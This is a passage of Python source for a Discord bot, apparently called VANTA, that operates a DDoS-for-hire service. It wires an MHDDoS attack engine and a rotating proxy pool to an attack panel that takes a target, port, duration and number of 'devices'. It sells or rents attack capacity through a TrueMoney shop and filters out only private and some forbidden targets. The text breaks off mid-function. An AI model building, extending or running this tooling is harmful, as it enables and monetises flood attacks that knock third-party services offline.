import asyncio
import ipaddress
import os
import re
import signal
import time
import traceback
from urllib.parse import urlparse

import aiohttp
import discord
from discord.ext import commands, tasks

from config import (
    BASE_DIR, BOT_TOKEN, PREFIX, OWNER_ID, LOG_CHANNEL_ID,
    MAX_DURATION, MAX_DEVICES_PURCHASE, MAX_WARNINGS,
    FORBIDDEN_TLDS, FORBIDDEN_IPS,
    SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE,
)
from database import Database
from mhddos_engine import MHDDoSEngine, L4_MODULES
from proxy_manager import ProxyManager
from truemoney import TrueMoneyClient
from ui_components import (
    AttackPanel, build_attack_embed, build_module_embed,
    build_attack_running_embed, ModuleView,
    ShopView, build_shop_embed, DeviceTypeView, PeriodView, QuantityView,
    RENT_PRICES, BUY_PRICES, RENT_SECONDS,
    ASSET_ATTACK_BANNER, ASSET_ATTACK_RUNNING, ASSET_SHOP_BANNER,
)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)
db = Database()
engine = MHDDoSEngine()
proxy_mgr = ProxyManager()
tm = TrueMoneyClient()

active_attacks: dict[int, dict] = {}

_http: aiohttp.ClientSession | None = None

_proxy_loop_started = False
_views_registered = False


async def http() -> aiohttp.ClientSession:
    global _http
    if _http is None or _http.closed:
        _http = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=5)
        )
    return _http


# ============================================================
# Helpers
# ============================================================
def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID


def _extract_host(target: str) -> str:
    t = target.strip().lower()
    if "://" in t:
        return urlparse(t).hostname or ""
    if t.startswith("["):
        end = t.find("]")
        if end > 0:
            return t[1:end]
    return t.split("/")[0].split(":")[0]


def is_forbidden(target: str) -> bool:
    host = _extract_host(target)
    if not host:
        return False
    if any(host == tld.lstrip(".") or host.endswith(tld)
           for tld in FORBIDDEN_TLDS):
        return True
    try:
        ip = ipaddress.ip_address(host)
        if (ip.is_private or ip.is_loopback
                or ip.is_link_local or ip.is_reserved):
            return True
    except ValueError:
        pass
    return host in FORBIDDEN_IPS


def _file(path: str) -> discord.File | None:
    if path and os.path.exists(path):
        return discord.File(path, filename=os.path.basename(path))
    return None


# ============================================================
# Tasks
# ============================================================
@tasks.loop(minutes=1)
async def rental_watchdog():
    try:
        expired = await db.pop_expired_rentals()
    except asyncio.CancelledError:
        raise
    except Exception as e:
        print(f"[watchdog] {e}")
        traceback.print_exc()
        return
    for r in expired:
        user = bot.get_user(r["user_id"])
        if user:
            try:
                await user.send(
                    f"⏰ ยศเช่าหมดอายุ — ลบ {r['devices']} device แล้ว"
                )
            except (discord.Forbidden, discord.HTTPException):
                pass


# ============================================================
# Events
# ============================================================
@bot.event
async def on_ready():
    global _http, _proxy_loop_started, _views_registered

    os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, "assets"), exist_ok=True)
    await db.init()
    print(f"[VANTA] logged in as {bot.user}")

    if _http is None or _http.closed:
        _http = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=5)
        )

    if not _proxy_loop_started:
        asyncio.create_task(proxy_mgr.auto_refresh_loop())
        _proxy_loop_started = True

    if not _views_registered:
        bot.add_view(AttackPanel(OWNER_ID))
        bot.add_view(ShopView())
        _views_registered = True

    if not rental_watchdog.is_running():
        rental_watchdog.start()


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MemberNotFound):
        await ctx.send("หา member ไม่เจอ")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"ใช้: `!{ctx.command.name} {error.param.name}`")
    elif isinstance(error, commands.CommandNotFound):
        pass
    elif isinstance(error, commands.CommandInvokeError):
        print(f"[cmd invoke] {error.original}")
        traceback.print_exception(
            type(error.original), error.original, error.original.__traceback__
        )
    else:
        print(f"[cmd error] {error}")
        traceback.print_exception(type(error), error, error.__traceback__)


# ============================================================
# Setup commands
# ============================================================
@bot.command(name="ddos", aliases=["setup"])
async def ddos_panel(ctx):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงถุ้ย")
        return
    f = _file(ASSET_ATTACK_BANNER)
    kwargs = {"embed": build_attack_embed(with_image=bool(f)),
              "view": AttackPanel(OWNER_ID)}
    if f:
        kwargs["file"] = f
    await ctx.send(**kwargs)


@bot.command(name="shop")
async def shop_panel(ctx):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    f = _file(ASSET_SHOP_BANNER)
    kwargs = {"embed": build_shop_embed(with_image=bool(f)),
              "view": ShopView()}
    if f:
        kwargs["file"] = f
    await ctx.send(**kwargs)


@bot.command(name="proxy")
async def proxy_status(ctx):
    if not is_owner(ctx.author.id):
        return
    pool = len(proxy_mgr.proxies or [])
    ready = "✅" if proxy_mgr.ready.is_set() else "⏳ กำลังโหลด"
    await ctx.send(
        f"**Proxy pool:** {pool} live {ready}\n"
        f"**Sources:** {len(proxy_mgr.__class__.__dict__) and 2 or 0}"
    )


# ============================================================
# Attack flow
# ============================================================
async def handle_attack_submit(interaction: discord.Interaction, modal):
    user_id = interaction.user.id

    if not is_owner(user_id):
        await interaction.response.send_message(
            "ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงถุ้ย", ephemeral=True
        )
        return

    user = await db.get_user(user_id)
    if not user:
        await interaction.response.send_message(
            "DB error — ลองอีกครั้ง", ephemeral=True
        )
        return

    if user["banned"]:
        await interaction.response.send_message(
            "มึงโดนแบนอยู่ ใช้บอทไม่ได้ — ติดต่อเจ้าของบอท", ephemeral=True
        )
        return

    target = modal.target.value.strip()
    try:
        port = int(modal.port.value)
        duration = min(int(modal.duration.value), MAX_DURATION)
        devices = int(modal.device.value)
    except ValueError:
        await interaction.response.send_message(
            "ใส่ตัวเลขให้ถูกต้อง (Port / Time / Device)", ephemeral=True
        )
        return

    if port < 1 or port > 65535:
        await interaction.response.send_message(
            "Port ต้องอยู่ระหว่าง 1-65535", ephemeral=True
        )
        return

    if duration < 1:
        await interaction.response.send_message(
            "Time ต้องมากกว่า 0", ephemeral=True
        )
        return

    if devices < 1 or devices > user["devices"]:
        await interaction.response.send_message(
            f"มีDevice ไม่พอนะ ไปซื้อเพิ่มด้วย (มี {user['devices']} เครื่อง)",
            ephemeral=True,
        )
        return

    if is_forbidden(target):
        warns = await db.add_warning(user_id)
        if warns >= MAX_WARNINGS:
            await interaction.response.send_message(
                "อย่ายิงเว็บต้องห้ามอ่านด้วยอีโง่ — ครบ 3 ครั้ง **โดนแบนแล้ว**",
                ephemeral=True,
            )
        else:
            await interaction.response.send_message(
                f"อย่ายิงเว็บต้องห้ามอ่านด้วยอีโง่ เตือนรอบ {warns}",
                ephemeral=True,
            )
        return

    view = ModuleView(user_id, target, port, duration, devices)
    await interaction.response.send_message(
        embed=build_module_embed(), view=view, ephemeral=True
    )


async def start_attack(interaction: discord.Interaction, module: str,
                       target: str, port: int, duration: int, devices: int):
    user_id = interaction.user.id

    if engine.is_running(user_id):
        await interaction.response.send_message(
            "มึงมี attack รันอยู่แล้ว", ephemeral=True
        )
        return

    await interaction.response.defer(ephemeral=True)

    # รอ proxy pool ถ้ายังไม่พร้อม — max 30 วิ
    if not proxy_mgr.ready.is_set():
        try:
            await asyncio.wait_for(proxy_mgr.ready.wait(), timeout=30)
        except asyncio.TimeoutError:
            pass

    # เตรียม proxy slices
    sub_nodes = devices * SUB_NODES_PER_DEVICE